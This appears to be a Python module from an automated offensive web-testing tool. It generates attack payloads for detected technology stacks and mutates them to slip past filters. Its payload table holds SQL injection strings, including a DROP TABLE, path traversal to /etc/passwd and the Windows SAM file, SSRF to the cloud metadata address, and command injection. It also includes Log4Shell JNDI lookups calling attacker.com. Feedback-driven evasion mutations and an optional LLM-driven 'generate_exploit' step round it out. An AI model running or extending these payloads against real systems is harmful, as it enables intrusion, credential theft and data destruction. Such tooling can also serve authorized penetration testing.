"""
Tier 2: Context-Sensitive Adaptive Payload Generation
Generates payloads based on detected technology stack and vulnerabilities.
"""

from typing import List, Dict, Optional, Tuple
import json
import hashlib
from dataclasses import dataclass, asdict
from enum import Enum


class PayloadSource(Enum):
    """Enumeration for payload sources"""
    ADAPTIVE = "adaptive"
    LLM = "llm"
    MUTATION = "mutation"
    KB = "kb"


@dataclass
class GeneratedPayload:
    """Structured payload representation"""
    payload: str
    vector: str
    confidence: float
    tier: int = 2
    source: str = "adaptive"
    tech_required: List[str] = None
    evasion_techniques: List[str] = None
    
    def to_dict(self) -> dict:
        """Convert to dictionary"""
        return asdict(self)


class TechStackMapper:
    """Maps detected technologies to optimal Tier 1 payloads"""
    
    # Known technology mappings with payload recommendations
    TECH_MAPPINGS = {
        "mysql": {
            "payloads": ["sql_injection"],
            "variants": ["mysql-specific", "time-based", "error-based"],
            "confidence": 0.95
        },
        "apache": {
            "payloads": ["path_traversal", "cve"],
            "variants": ["apache-specific", "mod_rewrite"],
            "confidence": 0.85
        },
        "nginx": {
            "payloads": ["ssrf"],
            "variants": ["request_smuggling", "path_traversal"],
            "confidence": 0.80
        },
        "php": {
            "payloads": ["template_injection"],
            "variants": ["twig", "smarty", "blade"],
            "confidence": 0.90
        },
        "python": {
            "payloads": ["template_injection"],
            "variants": ["jinja2", "mako", "django"],
            "confidence": 0.88
        },
        "java": {
            "payloads": ["log4j", "spring"],
            "variants": ["deserialization", "expression_language"],
            "confidence": 0.92
        },
        "node": {
            "payloads": ["command_injection"],
            "variants": ["prototype_pollution", "template_injection"],
            "confidence": 0.87
        },
        "wordpress": {
            "payloads": ["credential_testing", "plugin_exploit"],
            "variants": ["authentication_bypass", "sql_injection"],
            "confidence": 0.84
        },
        "oracle": {
            "payloads": ["sql_injection"],
            "variants": ["oracle-specific", "time-based"],
            "confidence": 0.93
        },
        "postgres": {
            "payloads": ["sql_injection"],
            "variants": ["postgres-specific", "blind-sql"],
            "confidence": 0.94
        },
        "mssql": {
            "payloads": ["sql_injection"],
            "variants": ["mssql-specific", "stacked-queries"],
            "confidence": 0.92
        },
        "mongodb": {
            "payloads": ["nosql_injection"],
            "variants": ["operator-injection", "javascript-injection"],
            "confidence": 0.89
        },
        "redis": {
            "payloads": ["command_injection"],
            "variants": ["redis-cli", "auth-bypass"],
            "confidence": 0.91
        },
        "elasticsearch": {
            "payloads": ["query_injection"],
            "variants": ["dsl-injection", "script-injection"],
            "confidence": 0.85
        },
        "graphql": {
            "payloads": ["query_injection"],
            "variants": ["introspection", "alias-attack"],
            "confidence": 0.82
        },
    }
    
    def __init__(self):
        """Initialize tech stack mapper"""
        self.cache = {}
    
    def map_tech_to_payloads(self, tech_stack: List[str]) -> Dict[str, List[Dict]]:
        """
        Maps detected technologies to best Tier 1 payloads.
        
        Args:
            tech_stack: List of detected technologies
            
        Returns:
            Dictionary mapping tech to ranked payload recommendations
        """
        result = {}
        
        for tech in tech_stack:
            tech_lower = tech.lower()
            
            # Check cache
            if tech_lower in self.cache:
                result[tech] = self.cache[tech_lower]
                continue
            
            # Look up in mappings
            if tech_lower in self.TECH_MAPPINGS:
                mapping = self.TECH_MAPPINGS[tech_lower]
                payload_list = []
                
                for i, payload_type in enumerate(mapping["payloads"]):
                    for variant in mapping["variants"]:
                        # Adjust confidence based on position (first payloads more likely)
                        adj_confidence = mapping["confidence"] * (1 - (i * 0.05))
                        
                        payload_list.append({
                            "payload_type": payload_type,
                            "variant": variant,
                            "confidence": round(adj_confidence, 3),
                            "technology": tech,
                            "rank": len(payload_list) + 1
                        })
                
                result[tech] = payload_list
                self.cache[tech_lower] = payload_list
            else:
                # Unknown technology - suggest generic payloads
                result[tech] = [{
                    "payload_type": "generic",
                    "variant": "unknown-tech",
                    "confidence": 0.50,
                    "technology": tech,
                    "rank": 1
                }]
        
        return result
    
    def get_combined_confidence(self, tech_stack: List[str]) -> float:
        """Calculate combined confidence for all technologies"""
        if not tech_stack:
            return 0.0
        
        mappings = self.map_tech_to_payloads(tech_stack)
        confidences = []
        
        for tech, payloads in mappings.items():
            if payloads:
                confidences.append(payloads[0]["confidence"])
        
        return sum(confidences) / len(confidences) if confidences else 0.5


class AdaptivePayloadGenerator:
    """Generates context-sensitive payloads based on tech stack and vulnerabilities"""
    
    # Tier 1 payload templates (simplified)
    TIER1_PAYLOADS = {
        "sql_injection": [
            "' OR '1'='1",
            "' UNION SELECT NULL--",
            "' AND SLEEP(5)--",
            "'; DROP TABLE users--",
        ],
        "path_traversal": [
            "../../../etc/passwd",
            "..\\..\\..\\windows\\system32\\config\\sam",
            "....//....//....//etc/passwd",
            "%2e%2e%2f%2e%2e%2fetc%2fpasswd",
        ],
        "ssrf": [
            "http://127.0.0.1:8080",
            "http://localhost/admin",
            "http://169.254.169.254/latest/meta-data/",
            "gopher://localhost:6379/",
        ],
        "template_injection": [
            "${7*7}",
            "{{7*7}}",
            "<%= 7*7 %>",
            "{# test #}",
        ],
        "command_injection": [
            "; cat /etc/passwd",
            "| whoami",
            "` id `",
            "$(whoami)",
        ],
        "log4j": [
            "${jndi:ldap://attacker.com/a}",
            "${jndi:rmi://attacker.com/a}",
        ],
    }
    
    def __init__(self, cognitive_engine=None):
        """
        Initialize adaptive payload generator.
        
        Args:
            cognitive_engine: Optional LLM-based cognitive engine for generation
        """
        self.cognitive_engine = cognitive_engine
        self.tech_mapper = TechStackMapper()
        self.ranker = PayloadRanker()
        self.mutation_history = {}
    
    def generate_for_context(
        self,
        tech_stack: List[str],
        vulnerabilities: List[Dict] = None,
        kb_top_payloads: List[str] = None
    ) -> List[Dict]:
        """
        Generate payloads adapted to specific technology context.
        
        Step 1: Use TechStackMapper to select relevant Tier 1 payloads
        Step 2: If CognitiveEngine available, call generate_exploit() with context
        Step 3: Apply basic mutations (from tier2_evasion if available)
        Step 4: Rank by estimated success probability
        
        Args:
            tech_stack: Detected technologies
            vulnerabilities: List of known vulnerabilities
            kb_top_payloads: Knowledge base top payloads
            
        Returns:
            Ranked list of payload dicts
        """
        payloads = []
        vulnerabilities = vulnerabilities or []
        
        # Step 1: Map tech to Tier 1 payloads
        tech_mappings = self.tech_mapper.map_tech_to_payloads(tech_stack)
        
        for tech, payload_recs in tech_mappings.items():
            for rec in payload_recs:
                payload_type = rec["payload_type"]
                
                if payload_type in self.TIER1_PAYLOADS:
                    tier1_payloads = self.TIER1_PAYLOADS[payload_type]
                    
                    for tier1_payload in tier1_payloads:
                        # Step 2: Try LLM generation if available
                        if self.cognitive_engine:
                            try:
                                llm_payload = self.cognitive_engine.generate_exploit(
                                    vulnerability_type=payload_type,
                                    technology=tech,
                                    context={
                                        "tech_stack": tech_stack,
                                        "vulnerabilities": vulnerabilities,
                                        "base_payload": tier1_payload
                                    }
                                )
                                if llm_payload:
                                    payloads.append({
                                        "payload": llm_payload,
                                        "vector": payload_type,
                                        "confidence": min(rec["confidence"] * 1.1, 0.99),
                                        "tier": 2,
                                        "source": "llm",
                                        "technology": tech
                                    })
                            except Exception:
                                pass  # Fallback to baseline
                        
                        # Add baseline payload
                        confidence = self._estimate_success(tier1_payload, tech_stack)
                        payloads.append({
                            "payload": tier1_payload,
                            "vector": payload_type,
                            "confidence": confidence,
                            "tier": 2,
                            "source": "adaptive",
                            "technology": tech
                        })
        
        # Step 3: Apply mutations (basic ones without tier2_evasion dependency)
        mutated = self._apply_basic_mutations(payloads)
        payloads.extend(mutated)
        
        # Add KB payloads if provided
        if kb_top_payloads:
            for kb_payload in kb_top_payloads:
                payloads.append({
                    "payload": kb_payload,
                    "vector": "kb_derived",
                    "confidence": 0.75,
                    "tier": 2,
                    "source": "kb",
                    "technology": "multi"
                })
        
        # Step 4: Rank by success probability
        ranked = self.ranker.rank(payloads)
        deduplicated = self.ranker.deduplicate(ranked)
        
        return deduplicated[:50]  # Return top 50
    
    def generate_from_feedback(
        self,
        original_payload: str,
        execution_result: Dict
    ) -> List[Dict]:
        """
        Generate mutations based on failed payload feedback.
        
        Args:
            original_payload: The failed payload
            execution_result: Result dict with error message, status, etc.
            
        Returns:
            List of mutated payloads
        """
        mutations = []
        
        # Parse error message for clues
        error_msg = execution_result.get("error", "").lower()
        status = execution_result.get("status", "unknown")
        
        # Strategy selection based on failure mode
        strategies = []
        
        if "filtered" in error_msg or "blocked" in error_msg:
            strategies.extend(["url_encode", "case_variation", "comment_insert"])
        elif "syntax" in error_msg:
            strategies.extend(["whitespace_variation", "comment_insert"])
        elif "timeout" in error_msg or status == 429:
            strategies.extend(["timing_variation"])
        else:
            strategies.extend(["url_encode", "case_variation", "null_byte"])
        
        # Generate mutations using basic techniques
        for strategy in strategies:
            if strategy == "url_encode":
                for level in [1, 2]:
                    mutated = self._url_encode(original_payload, level)
                    mutations.append({
                        "payload": mutated,
                        "vector": "feedback_mutation",
                        "confidence": 0.65,
                        "tier": 2,
                        "source": "mutation",
                        "technique": f"url_encode_l{level}"
                    })
            
            elif strategy == "case_variation":
                variants = self._case_variation(original_payload)
                for variant in variants[:3]:
                    mutations.append({
                        "payload": variant,
                        "vector": "feedback_mutation",
                        "confidence": 0.62,
                        "tier": 2,
                        "source": "mutation",
                        "technique": "case_variation"
                    })
            
            elif strategy == "comment_insert":
                mutated = self._comment_insert(original_payload, "sql")
                mutations.append({
                    "payload": mutated,
                    "vector": "feedback_mutation",
                    "confidence": 0.68,
                    "tier": 2,
                    "source": "mutation",
                    "technique": "comment_insert"
                })
            
            elif strategy == "null_byte":
                variants = self._null_byte_inject(original_payload)
                for variant in variants[:2]:
                    mutations.append({
                        "payload": variant,
                        "vector": "feedback_mutation",
                        "confidence": 0.60,
                        "tier": 2,
                        "source": "mutation",
                        "technique": "null_byte"
                    })
            
            elif strategy == "whitespace_variation":
                variants = self._whitespace_variation(original_payload)
                for variant in variants[:2]:
                    mutations.append({
                        "payload": variant,
                        "vector": "feedback_mutation",
                        "confidence": 0.61,
                        "tier": 2,
                        "source": "mutation",
                        "technique": "whitespace"
                    })
        
        return mutations
    
    def _estimate_success(self, payload: str, tech_stack: List[str]) -> float:
        """
        Estimate success probability using heuristics.
        
        Args:
            payload: The payload to estimate
            tech_stack: Detected technologies
            
        Returns:
            Probability between 0.0 and 1.0
        """
        base_confidence = 0.5
        
        # Payload complexity bonus
        if len(payload) > 30:
            base_confidence += 0.05
        if len(payload) > 100:
            base_confidence += 0.05
        
        # Tech stack alignment bonus
        if tech_stack:
            tech_mappings = self.tech_mapper.map_tech_to_payloads(tech_stack)
            if tech_mappings:
                base_confidence += 0.10
        
        # Known payload pattern bonus
        known_patterns = ["UNION", "SELECT", "OR", "DROP", "SLEEP", "etc/passwd"]
        for pattern in known_patterns:
            if pattern.lower() in payload.lower():
                base_confidence += 0.05
                break
        
        # Cap at 0.95
        return min(base_confidence, 0.95)
    
    def _apply_basic_mutations(self, payloads: List[Dict]) -> List[Dict]:
        """Apply basic mutations to payloads"""
        mutations = []
        
        for payload_dict in payloads[:20]:  # Limit mutations to top 20
            payload = payload_dict["payload"]
            
            # URL encode mutation
            encoded = self._url_encode(payload, 1)
            mutations.append({
                "payload": encoded,
                "vector": payload_dict["vector"],
                "confidence": payload_dict["confidence"] * 0.9,
                "tier": 2,
                "source": "mutation",
                "mutation_type": "url_encode"
            })
            
            # Case variation
            variants = self._case_variation(payload)
            if variants:
                mutations.append({
                    "payload": variants[0],
                    "vector": payload_dict["vector"],
                    "confidence": payload_dict["confidence"] * 0.85,
                    "tier": 2,
                    "source": "mutation",
                    "mutation_type": "case_variation"
                })
        
        return mutations
    
    def _url_encode(self, payload: str, level: int = 1) -> str:
        """URL encode payload to specified level"""
        import urllib.parse
        result = payload
        for _ in range(level):
            result = urllib.parse.quote(result, safe='')
        return result
    
    def _case_variation(self, payload: str) -> List[str]:
        """Generate case variations"""
        if not payload:
            return []
        
        variations = [
            payload.upper(),
            payload.lower(),
            payload.capitalize(),
        ]
        
        # Alternating case
        alt = ""
        for i, char in enumerate(payload):
            if char.isalpha():
                alt += char.upper() if i % 2 == 0 else char.lower()
            else:
                alt += char
        variations.append(alt)
        
        return variations
    
    def _comment_insert(self, payload: str, language: str = "sql") -> str:
        """Insert comments into payload"""
        if language == "sql":
            # Insert SQL comments
            return payload.replace(" ", " /**/")
        elif language == "html":
            return f"<!--{payload}-->"
        else:
            return payload
    
    def _null_byte_inject(self, payload: str) -> List[str]:
        """Inject null bytes at strategic positions"""
        variants = []
        
        # Try null byte at different positions
        for i in range(0, len(payload), max(1, len(payload) // 3)):
            variant = payload[:i] + "%00" + payload[i:]
            variants.append(variant)
        
        return variants
    
    def _whitespace_variation(self, payload: str) -> List[str]:
        """Generate whitespace variations"""
        variants = []
        
        # Tab variation
        variants.append(payload.replace(" ", "\t"))
        
        # Double space
        variants.append(payload.replace(" ", "  "))
        
        # Newline insertion (for multi-line payloads)
        if len(payload) > 20:
            mid = len(payload) // 2
            variants.append(payload[:mid] + "\n" + payload[mid:])
        
        return variants


class PayloadRanker:
    """Ranks and deduplicates payloads"""
    
    def __init__(self):
        """Initialize ranker"""
        self.seen_hashes = set()
    
    def rank(
        self,
        payloads: List[Dict],
        criteria: Dict = None
    ) -> List[Dict]:
        """
        Rank payloads by multiple criteria.
        
        Args:
            payloads: List of payload dicts
            criteria: Custom ranking criteria (default: confidence, novelty)
            
        Returns:
            Ranked list of payloads
        """
        criteria = criteria or {
            "confidence": 0.6,
            "novelty": 0.2,
            "evasion": 0.2
        }
        
        # Score each payload
        for payload_dict in payloads:
            score = 0.0
            
            # Confidence score
            confidence = payload_dict.get("confidence", 0.5)
            score += confidence * criteria["confidence"]
            
            # Novelty score (prefer fewer characters, less common patterns)
            novelty = 1.0 - min(len(payload_dict["payload"]) / 500, 1.0)
            score += novelty * criteria["novelty"]
            
            # Evasion score (prefer encoded/mutated)
            source = payload_dict.get("source", "")
            if source in ["mutation", "llm"]:
                score += 0.5 * criteria["evasion"]
            
            payload_dict["rank_score"] = round(score, 4)
        
        # Sort by rank score descending
        ranked = sorted(payloads, key=lambda x: x["rank_score"], reverse=True)
        
        return ranked
    
    def deduplicate(self, payloads: List[Dict]) -> List[Dict]:
        """
        Remove semantically similar payloads.
        
        Args:
            payloads: List of payload dicts
            
        Returns:
            Deduplicated list
        """
        unique = []
        seen_hashes = set()
        
        for payload_dict in payloads:
            payload = payload_dict["payload"]
            
            # Create hash of payload content (not exact string)
            payload_normalized = payload.lower().replace(" ", "").replace("\n", "")
            payload_hash = hashlib.md5(payload_normalized.encode()).hexdigest()
            
            if payload_hash not in seen_hashes:
                unique.append(payload_dict)
                seen_hashes.add(payload_hash)
        
        return unique


def main():
    """Example usage"""
    generator = AdaptivePayloadGenerator()
    
    # Example: Generate payloads for a typical web stack
    tech_stack = ["apache", "php", "mysql", "wordpress"]
    payloads = generator.generate_for_context(tech_stack)
    
    print(f"Generated {len(payloads)} payloads for {tech_stack}")
    print("\nTop 5 payloads:")
    for i, p in enumerate(payloads[:5], 1):
        print(f"{i}. [{p['vector']}] {p['payload'][:60]}... (conf: {p['confidence']})")


if __name__ == "__main__":
    main()
